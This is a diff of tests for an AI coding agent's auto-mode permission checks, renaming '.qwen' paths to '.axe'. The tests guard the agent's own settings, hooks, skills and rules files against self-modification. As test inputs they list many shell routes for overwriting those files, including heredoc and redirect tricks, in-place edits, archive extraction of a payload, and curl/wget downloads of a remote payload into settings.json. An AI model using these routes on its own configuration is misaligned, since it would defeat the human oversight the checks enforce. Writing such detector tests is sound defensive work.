@@ -143,16 +143,16 @@ function ctx(over: Partial<PermissionCheckContext>): PermissionCheckContext {
 describe('isAutoModeProtectedWritePath', () => {
   it('matches Qwen self-modification files and directories', () => {
     const protectedPaths = [
-      '/repo/.qwen/settings.json',
-      '/repo/.qwen/settings.local.json',
+      '/repo/.axe/settings.json',
+      '/repo/.axe/settings.local.json',
       '/repo/QWEN.md',
       '/repo/AGENTS.md',
-      '/repo/.qwen/commands/review.md',
-      '/repo/.qwen/agents/reviewer.md',
-      '/repo/.qwen/skills/skill-a/SKILL.md',
-      '/repo/.qwen/hooks/pre-tool-use.json',
-      '/repo/.qwen/QWEN.local.md',
-      '/repo/.qwen/rules/backend.md',
+      '/repo/.axe/commands/review.md',
+      '/repo/.axe/agents/reviewer.md',
+      '/repo/.axe/skills/skill-a/SKILL.md',
+      '/repo/.axe/hooks/pre-tool-use.json',
+      '/repo/.axe/QWEN.local.md',
+      '/repo/.axe/rules/backend.md',
       '/repo/.mcp.json',
       '/repo/.git',
     ];
@@ -165,8 +165,8 @@ describe('isAutoModeProtectedWritePath', () => {
   it('does not treat ordinary source files or worktree files as protected', () => {
     const ordinaryPaths = [
       '/repo/src/index.ts',
-      '/repo/.qwen/PROJECT_SUMMARY.md',
-      '/repo/.qwen/worktrees/feature/src/index.ts',
+      '/repo/.axe/PROJECT_SUMMARY.md',
+      '/repo/.axe/worktrees/feature/src/index.ts',
     ];
 
     for (const filePath of ordinaryPaths) {
@@ -176,11 +176,11 @@ describe('isAutoModeProtectedWritePath', () => {
 
   it('still protects config surfaces inside managed worktrees', () => {
     const protectedPaths = [
-      '/repo/.qwen/worktrees/feature/.qwen/settings.json',
-      '/repo/.qwen/worktrees/feature/AGENTS.md',
-      '/repo/.qwen/worktrees/feature/.qwen/QWEN.local.md',
-      '/repo/.qwen/worktrees/feature/.qwen/rules/backend.md',
-      '/repo/.qwen/worktrees/feature/.mcp.json',
+      '/repo/.axe/worktrees/feature/.axe/settings.json',
+      '/repo/.axe/worktrees/feature/AGENTS.md',
+      '/repo/.axe/worktrees/feature/.axe/QWEN.local.md',
+      '/repo/.axe/worktrees/feature/.axe/rules/backend.md',
+      '/repo/.axe/worktrees/feature/.mcp.json',
     ];
 
     for (const filePath of protectedPaths) {
@@ -212,7 +212,7 @@ describe('isAutoModeProtectedWritePath', () => {
       const protectedPaths = [
         '/repo/CUSTOM_AGENTS.md',
         '/repo/docs/TEAM_CONTEXT.md',
-        '/repo/.qwen/worktrees/feature/CUSTOM_AGENTS.md',
+        '/repo/.axe/worktrees/feature/CUSTOM_AGENTS.md',
       ];
 
       for (const filePath of protectedPaths) {
@@ -281,7 +281,7 @@ describe('isAutoModeProtectedWritePath', () => {
     const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-write-path-'));
 
     try {
-      const protectedDir = path.join(tmpRoot, '.qwen');
+      const protectedDir = path.join(tmpRoot, '.axe');
       const settingsPath = path.join(protectedDir, 'settings.json');
       const linkPath = path.join(tmpRoot, 'scratch');
       fs.mkdirSync(protectedDir, { recursive: true });
@@ -348,16 +348,16 @@ describe('passesAcceptEditsFastPath', () => {
 
   it('rejects Qwen self-modification paths even inside cwd', () => {
     const protectedPaths = [
-      `${cwd}/.qwen/settings.json`,
-      `${cwd}/.qwen/settings.local.json`,
+      `${cwd}/.axe/settings.json`,
+      `${cwd}/.axe/settings.local.json`,
       `${cwd}/QWEN.md`,
       `${cwd}/AGENTS.md`,
-      `${cwd}/.qwen/commands/review.md`,
-      `${cwd}/.qwen/agents/reviewer.md`,
-      `${cwd}/.qwen/skills/review/SKILL.md`,
-      `${cwd}/.qwen/hooks/pre-tool-use.json`,
-      `${cwd}/.qwen/QWEN.local.md`,
-      `${cwd}/.qwen/rules/backend.md`,
+      `${cwd}/.axe/commands/review.md`,
+      `${cwd}/.axe/agents/reviewer.md`,
+      `${cwd}/.axe/skills/review/SKILL.md`,
+      `${cwd}/.axe/hooks/pre-tool-use.json`,
+      `${cwd}/.axe/QWEN.local.md`,
+      `${cwd}/.axe/rules/backend.md`,
       `${cwd}/.mcp.json`,
     ];
 
@@ -371,12 +371,12 @@ describe('passesAcceptEditsFastPath', () => {
     }
   });
 
-  it('allows ordinary files under .qwen/worktrees but rejects nested config surfaces', () => {
+  it('allows ordinary files under .axe/worktrees but rejects nested config surfaces', () => {
     expect(
       passesAcceptEditsFastPath(
         ctx({
           toolName: ToolNames.WRITE_FILE,
-          filePath: `${cwd}/.qwen/worktrees/feature/src/index.ts`,
+          filePath: `${cwd}/.axe/worktrees/feature/src/index.ts`,
         }),
         config,
       ),
@@ -386,7 +386,7 @@ describe('passesAcceptEditsFastPath', () => {
       passesAcceptEditsFastPath(
         ctx({
           toolName: ToolNames.WRITE_FILE,
-          filePath: `${cwd}/.qwen/worktrees/feature/.qwen/settings.json`,
+          filePath: `${cwd}/.axe/worktrees/feature/.axe/settings.json`,
         }),
         config,
       ),
@@ -396,7 +396,7 @@ describe('passesAcceptEditsFastPath', () => {
   it('rejects symlinks that resolve to protected self-modification paths', () => {
     const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-auto-mode-'));
     try {
-      const qwenDir = path.join(tmpRoot, '.qwen');
+      const qwenDir = path.join(tmpRoot, '.axe');
       fs.mkdirSync(qwenDir, { recursive: true });
       const target = path.join(qwenDir, 'settings.json');
       fs.writeFileSync(target, '{}');
@@ -517,7 +517,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.EDIT,
-          filePath: '/Users/test/.qwen/settings.json',
+          filePath: '/Users/test/.axe/settings.json',
         }),
       ),
     ).toBe(true);
@@ -526,7 +526,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.WRITE_FILE,
-          filePath: '/repo/.qwen/QWEN.local.md',
+          filePath: '/repo/.axe/QWEN.local.md',
         }),
       ),
     ).toBe(true);
@@ -535,7 +535,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.NOTEBOOK_EDIT,
-          filePath: '/repo/.qwen/skills/review/demo.ipynb',
+          filePath: '/repo/.axe/skills/review/demo.ipynb',
         }),
       ),
     ).toBe(true);
@@ -546,7 +546,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'echo "{}" > .qwen/settings.json',
+          command: 'echo "{}" > .axe/settings.json',
           cwd: '/repo',
         }),
       ),
@@ -556,7 +556,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.MONITOR,
-          command: 'bash -lc \'echo "{}" > .qwen/settings.json\'',
+          command: 'bash -lc \'echo "{}" > .axe/settings.json\'',
           cwd: '/repo',
         }),
       ),
@@ -638,7 +638,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
+          command: "bash -lc 'echo ok' && echo hi > .axe/settings.json",
           cwd: '/repo',
         }),
       ),
@@ -672,7 +672,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: '(echo > .qwen/settings.json)',
+          command: '(echo > .axe/settings.json)',
           cwd: '/repo',
         }),
       ),
@@ -686,7 +686,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
           toolName: ToolNames.SHELL,
           command: [
             "bash <<'SCRIPT'",
-            "echo '{}' > .qwen/settings.json",
+            "echo '{}' > .axe/settings.json",
             'SCRIPT',
           ].join('\n'),
           cwd: '/repo',
@@ -702,7 +702,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
           toolName: ToolNames.SHELL,
           command: [
             "bash <<'SCRIPT'",
-            'cp /tmp/payload .qwen/settings.json',
+            'cp /tmp/payload .axe/settings.json',
             'SCRIPT',
           ].join('\n'),
           cwd: '/repo',
@@ -711,22 +711,22 @@ describe('shouldForceAutoModeReviewForAllow', () => {
     ).toBe(true);
 
     for (const command of [
-      ["bash <<'SCRIPT'", "tee .qwen/settings.json <<< '{}'", 'SCRIPT'].join(
+      ["bash <<'SCRIPT'", "tee .axe/settings.json <<< '{}'", 'SCRIPT'].join(
         '\n',
       ),
       [
         "bash <<'SCRIPT'",
-        'dd if=/tmp/payload of=.qwen/settings.json',
+        'dd if=/tmp/payload of=.axe/settings.json',
         'SCRIPT',
       ].join('\n'),
       [
         "bash <<'SCRIPT'",
-        'sort -o .qwen/settings.json /dev/null',
+        'sort -o .axe/settings.json /dev/null',
         'SCRIPT',
       ].join('\n'),
       [
         "bash <<'SCRIPT'",
-        "node -e \"require('fs').writeFileSync('.qwen/settings.json', '{}')\"",
+        "node -e \"require('fs').writeFileSync('.axe/settings.json', '{}')\"",
         'SCRIPT',
       ].join('\n'),
     ]) {
@@ -747,7 +747,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'D=.qwen/settings.json; cp payload "$D"',
+          command: 'D=.axe/settings.json; cp payload "$D"',
           cwd: '/repo',
         }),
       ),
@@ -768,8 +768,8 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for awk in-place edits to protected paths', () => {
     for (const command of [
-      'awk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
-      'gawk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
+      'awk -i inplace \'{gsub(/x/, "y")}1\' .axe/settings.json',
+      'gawk -i inplace \'{gsub(/x/, "y")}1\' .axe/settings.json',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -785,8 +785,8 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for sort writing protected paths via output flags', () => {
     for (const command of [
-      'sort -o .qwen/settings.json /dev/null',
-      'sort --output=.qwen/settings.json /dev/null',
+      'sort -o .axe/settings.json /dev/null',
+      'sort --output=.axe/settings.json /dev/null',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -807,7 +807,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
           toolName: ToolNames.SHELL,
           command: [
             "bash <<'SCRIPT'",
-            'echo "{}" > """.qwen/settings.json"""',
+            'echo "{}" > """.axe/settings.json"""',
             'SCRIPT',
           ].join('\n'),
           cwd: '/repo',
@@ -818,8 +818,8 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for protected clobber and fd redirects', () => {
     for (const command of [
-      "echo '{}' >| .qwen/settings.json",
-      "echo '{}' >& .qwen/settings.json",
+      "echo '{}' >| .axe/settings.json",
+      "echo '{}' >& .axe/settings.json",
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -838,7 +838,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: "echo '{}' > $'.qwen/settings.json'",
+          command: "echo '{}' > $'.axe/settings.json'",
           cwd: '/repo',
         }),
       ),
@@ -850,7 +850,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'cat <> .qwen/settings.json',
+          command: 'cat <> .axe/settings.json',
           cwd: '/repo',
         }),
       ),
@@ -871,10 +871,10 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for downloader output flags targeting protected paths', () => {
     for (const command of [
-      'curl -o .qwen/settings.json https://example.com/payload',
-      'curl -o.qwen/settings.json https://example.com/payload',
-      'wget -O .qwen/settings.json https://example.com/payload',
-      'wget -O.qwen/settings.json https://example.com/payload',
+      'curl -o .axe/settings.json https://example.com/payload',
+      'curl -o.axe/settings.json https://example.com/payload',
+      'wget -O .axe/settings.json https://example.com/payload',
+      'wget -O.axe/settings.json https://example.com/payload',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -890,13 +890,13 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for archive extraction commands targeting protected dirs', () => {
     for (const command of [
-      'tar xf payload.tar -C .qwen/skills',
-      'tar xf payload.tar -C.qwen/skills',
-      'tar xf payload.tar --directory=.qwen/skills',
-      'unzip payload.zip -d .qwen/skills',
-      'unzip payload.zip -d.qwen/skills',
-      'cpio -i -D .qwen/skills',
-      'cpio -i -D.qwen/skills',
+      'tar xf payload.tar -C .axe/skills',
+      'tar xf payload.tar -C.axe/skills',
+      'tar xf payload.tar --directory=.axe/skills',
+      'unzip payload.zip -d .axe/skills',
+      'unzip payload.zip -d.axe/skills',
+      'cpio -i -D .axe/skills',
+      'cpio -i -D.axe/skills',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -912,8 +912,8 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for patch output flags targeting protected paths', () => {
     for (const command of [
-      'patch --output=.qwen/settings.json -i fix.patch',
-      'patch -o.qwen/settings.json -i fix.patch',
+      'patch --output=.axe/settings.json -i fix.patch',
+      'patch -o.axe/settings.json -i fix.patch',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -932,7 +932,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'find . -exec cp {} .qwen/settings.json ;',
+          command: 'find . -exec cp {} .axe/settings.json ;',
           cwd: '/repo',
         }),
       ),
@@ -944,7 +944,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'find . -execdir cp {} .qwen/settings.json ;',
+          command: 'find . -execdir cp {} .axe/settings.json ;',
           cwd: '/repo',
         }),
       ),
@@ -953,9 +953,9 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for long in-place sed/perl writes to protected paths', () => {
     for (const command of [
-      "sed --in-place 's/x/y/' .qwen/settings.json",
-      "sed --in-place=.bak 's/x/y/' .qwen/settings.json",
-      "perl --in-place -e 's/x/y/' .qwen/settings.json",
+      "sed --in-place 's/x/y/' .axe/settings.json",
+      "sed --in-place=.bak 's/x/y/' .axe/settings.json",
+      "perl --in-place -e 's/x/y/' .axe/settings.json",
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -973,7 +973,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
     for (const command of [
       "sed 's/a/b/' /tmp/file",
       "perl -e 'print $_' /tmp/file",
-      "sed -n '1,10p' .qwen/settings.json",
+      "sed -n '1,10p' .axe/settings.json",
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
@@ -992,7 +992,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'echo "{}" > .qwen/settings.json',
+          command: 'echo "{}" > .axe/settings.json',
         }),
         '/repo',
       ),
@@ -1010,7 +1010,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.READ_FILE,
-          filePath: '/repo/.qwen/settings.json',
+          filePath: '/repo/.axe/settings.json',
         }),
       ),
     ).toBe(false);
